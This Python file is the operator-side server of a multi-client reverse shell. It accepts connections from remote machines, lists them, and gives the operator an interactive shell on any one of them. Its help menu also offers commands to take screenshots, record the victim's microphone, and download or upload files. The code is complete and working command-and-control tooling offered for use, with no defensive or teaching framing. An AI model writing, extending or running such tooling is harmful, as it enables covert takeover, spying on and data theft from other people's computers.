import socket
import subprocess
from threading import Thread
import re
import os

import tabulate
import tqdm

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1440 # max size of messages, setting to 1440 after experimentation, MTU size
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

class Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        # initialize the server socket
        self.server_socket = self.get_server_socket()
        # a dictionary of client addresses and sockets
        self.clients = {}
        # a dictionary mapping each client to their current working directory
        self.clients_cwd = {}
        # the current client that the server is interacting with
        self.current_client = None
        
    def get_server_socket(self, custom_port=None):
        # create a socket object
        s = socket.socket()
        # bind the socket to all IP addresses of this host
        if custom_port:
            # if a custom port is set, use it instead
            port = custom_port
        else:
            port = self.port
        s.bind((self.host, port))
        # make the PORT reusable, to prevent:
        # when you run the server multiple times in Linux, Address already in use error will raise
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.listen(5)
        print(f"Listening as {SERVER_HOST}:{port} ...")
        return s
    
    def accept_connection(self):
        while True:
            # accept any connections attempted
            try:
                client_socket, client_address = self.server_socket.accept()
            except OSError as e:
                print("Server socket closed, exiting...")
                break
            print(f"{client_address[0]}:{client_address[1]} Connected!")
            # receiving the current working directory of the client
            cwd = client_socket.recv(BUFFER_SIZE).decode()
            print("[+] Current working directory:", cwd)
            # add the client to the Python dicts
            self.clients[client_address] = client_socket
            self.clients_cwd[client_address] = cwd
        
    def accept_connections(self):
        # start a separate thread to accept connections
        self.connection_thread = Thread(target=self.accept_connection)
        # and set it as a daemon thread
        self.connection_thread.daemon = True
        self.connection_thread.start()
        
    def close_connections(self):
        """Close all the client sockets and server socket.
        Used for closing the program"""
        for _, client_socket in self.clients.items():
            client_socket.close()
        self.server_socket.close()
        
    def start_interpreter(self):
        """Custom interpreter"""
        while True:
            command = input("interpreter $> ")
            if re.search(r"help\w*", command):
                # "help" is detected, print the help
                print("Interpreter usage:")
                print(tabulate.tabulate([["Command", "Usage"], [
                    "help",
                    "Print this help message",
                ], ["list",
                    "List all connected users",
                ], ["use [machine_index]",
                    "Start reverse shell on the specified client, " \
                        "e.g 'use 1' will start the reverse shell on the second connected machine, " \
                            "and 0 for the first one.",
                ]
                ]))
                print("="*30, "Custom commands inside the reverse shell", "="*30)
                print(tabulate.tabulate([["Command", "Usage"], [
                    "abort",
                    "Remove the client from the connected clients",
                ], ["exit|quit",
                    "Get back to interpreter without removing the client",
                ], ["screenshot [path_to_img].png",
                    "Take a screenshot of the main screen and save it as an image file."
                ], ["recordmic [path_to_audio].wav [number_of_seconds]",
                    "Record the default microphone for number of seconds " \
                        "and save it as an audio file in the specified file." \
                            " An example is 'recordmic test.wav 5' will record for 5 " \
                                "seconds and save to test.wav in the current working directory"
                ], ["download [path_to_file]",
                    "Download the specified file from the client"
                ], ["upload [path_to_file]",
                    "Upload the specified file from your local machine to the client"
                ]]))
            elif re.search(r"list\w*", command):
                # list all the connected clients
                connected_clients = []
                for index, ((client_host, client_port), cwd) in enumerate(self.clients_cwd.items()):
                    connected_clients.append([index, client_host, client_port, cwd])
                # print the connected clients in tabular form
                print(tabulate.tabulate(connected_clients, headers=["Index", "Address", "Port", "CWD"]))
            elif (match := re.search(r"use\s*(\w*)", command)):
                try:
                    # get the index passed to the command
                    client_index = int(match.group(1))
                except ValueError:
                    # there is no digit after the use command
                    print("Please insert the index of the client, a number.")
                    continue
                else:
                    try:
                        self.current_client = list(self.clients)[client_index]
                    except IndexError:
                        print(f"Please insert a valid index, maximum is {len(self.clients)}.")
                        continue
                    else:
                        # start the reverse shell as self.current_client is set
                        self.start_reverse_shell()
            elif command.lower() in ["exit", "quit"]:
                # exit out of the interpreter if exit|quit are passed
                break
            elif command == "":
                # do nothing if command is empty (i.e a new line)
                pass
            else:
                print("Unavailable command:", command)
        self.close_connections()
        
    def start(self):
        """Method responsible for starting the server: 
        Accepting client connections and starting the main interpreter"""
        self.accept_connections()
        self.start_interpreter()
                        
    def start_reverse_shell(self):
        # get the current working directory from the current client
        cwd = self.clients_cwd[self.current_client]
        # get the socket too
        client_socket = self.clients[self.current_client]
        while True:
            # get the command from prompt
            command = input(f"{cwd} $> ")
            if not command.strip():
                # empty command
                continue
            if (match := re.search(r"local\s*(.*)", command)):
                local_command = match.group(1)
                if (cd_match := re.search(r"cd\s*(.*)", local_command)):
                    # if it's a 'cd' command, change directory instead of using subprocess.getoutput
                    cd_path = cd_match.group(1)
                    if cd_path:
                        os.chdir(cd_path)
                else:
                    local_output = subprocess.getoutput(local_command)
                    print(local_output)
                # if it's a local command (i.e starts with local), do not send it to the client
                continue
            # send the command to the client
            client_socket.sendall(command.encode())
            if command.lower() in ["exit", "quit"]:
                # if the command is exit, just break out of the loop
                break
            elif command.lower() == "abort":
                # if the command is abort, remove the client from the dicts & exit
                del self.clients[self.current_client]
                del self.clients_cwd[self.current_client]
                break
            elif (match := re.search(r"download\s*(.*)", command)):
                # receive the file
                self.receive_file()
            elif (match := re.search(r"upload\s*(.*)", command)):
                # send the specified file if it exists
                filename = match.group(1)
                if not os.path.isfile(filename):
                    print(f"The file {filename} does not exist in the local machine.")
                else:
                    self.send_file(filename)
            # retrieve command results
            output = self.receive_all_data(client_socket, BUFFER_SIZE).decode()
            # split command output and current directory
            results, cwd = output.split(SEPARATOR)
            # update the cwd
            self.clients_cwd[self.current_client] = cwd
            # print output
            print(results)
            
        self.current_client = None
        
    def receive_all_data(self, socket, buffer_size):
        """Function responsible for calling socket.recv()
        repeatedly until no data is to be received"""
        data = b""
        while True:
            output = socket.recv(buffer_size)
            data += output
            if not output or len(output) < buffer_size:
                break
            # if len(output) < buffer_size:
            #     data += self.receive_all_data(socket, buffer_size)
        return data
        
    def receive_file(self, port=5002):
        # make another server socket with a custom port
        s = self.get_server_socket(custom_port=port)
        # accept client connections
        client_socket, client_address = s.accept()
        print(f"{client_address} connected.")
        # receive the file
        Server._receive_file(client_socket)
        
    def send_file(self, filename, port=5002):
        # make another server socket with a custom port
        s = self.get_server_socket(custom_port=port)
        # accept client connections
        client_socket, client_address = s.accept()
        print(f"{client_address} connected.")
        # receive the file
        Server._send_file(client_socket, filename)
        
    @classmethod
    def _receive_file(cls, s: socket.socket, buffer_size=4096):
        # receive the file infos using socket
        received = s.recv(buffer_size).decode()
        filename, filesize = received.split(SEPARATOR)
        # remove absolute path if there is
        filename = os.path.basename(filename)
        # convert to integer
        filesize = int(filesize)
        # start receiving the file from the socket
        # and writing to the file stream
        progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
        with open(filename, "wb") as f:
            while True:
                # read 1024 bytes from the socket (receive)
                bytes_read = s.recv(buffer_size)
                if not bytes_read:    
                    # nothing is received
                    # file transmitting is done
                    break
                # write to the file the bytes we just received
                f.write(bytes_read)
                # update the progress bar
                progress.update(len(bytes_read))
        # close the socket
        s.close()
        
    @classmethod
    def _send_file(cls, s: socket.socket, filename, buffer_size=4096):
        # get the file size
        filesize = os.path.getsize(filename)
        # send the filename and filesize
        s.send(f"{filename}{SEPARATOR}{filesize}".encode())
        # start sending the file
        progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
        with open(filename, "rb") as f:
            while True:
                # read the bytes from the file
                bytes_read = f.read(buffer_size)
                if not bytes_read:
                    # file transmitting is done
                    break
                # we use sendall to assure transimission in 
                # busy networks
                s.sendall(bytes_read)
                # update the progress bar
                progress.update(len(bytes_read))
        # close the socket
        s.close()
                        

if __name__ == "__main__":
    server = Server(SERVER_HOST, SERVER_PORT)
    server.start()